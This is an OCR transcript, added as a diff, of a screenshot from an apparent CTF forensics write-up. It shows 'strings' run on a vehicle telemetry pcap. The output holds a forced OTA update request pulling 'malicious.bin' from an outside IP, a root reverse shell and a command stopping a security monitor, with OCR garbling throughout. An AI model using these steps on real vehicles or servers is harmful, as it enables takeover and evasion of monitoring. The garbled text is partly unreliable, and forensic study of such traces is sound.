@@ -1,0 +1,13 @@
+# OCR: QQ_1778736885323.webp
+# 来源: ./02-WriteUp/2026/2026-盘古石杯-初赛/QQ_1778736885323.webp
+# 引擎: Umi-OCR 2.1.5 / PaddleOCR (config_chinese, limit_side_len=2880, multi_para)
+# 生成: 2026-11-03 18:50
+
+NoahTie@ArkC/h/8/c/分/t/comm
+strings-a-n1o.ltelemetry_2o251215.pcap
+Strings v2.54-SearchforANsI and Unicodestringsin binary images.
+Copyright(c)1999-2021 MarkRussinovich Sysinternals-www.sysinternals.com
+MQTT_PUBLISH:topic=vehicle/telemetry,payload={"lat":31.2,"lon":121.4,"speed":180}
+HTTP_GET:/api/v1/ota/force_update?pkg=http://45.33.22.11/malicious.binJtle@ HTTP_GET:/media/audio/playlist_1.m3u8Host:streaming.starway.comltle
+Reverse shell connected...root@staros:~# id uid=o(root)gid=o(root)groups=o(root)
+root@staros:v#systemctLstopsec_monitor
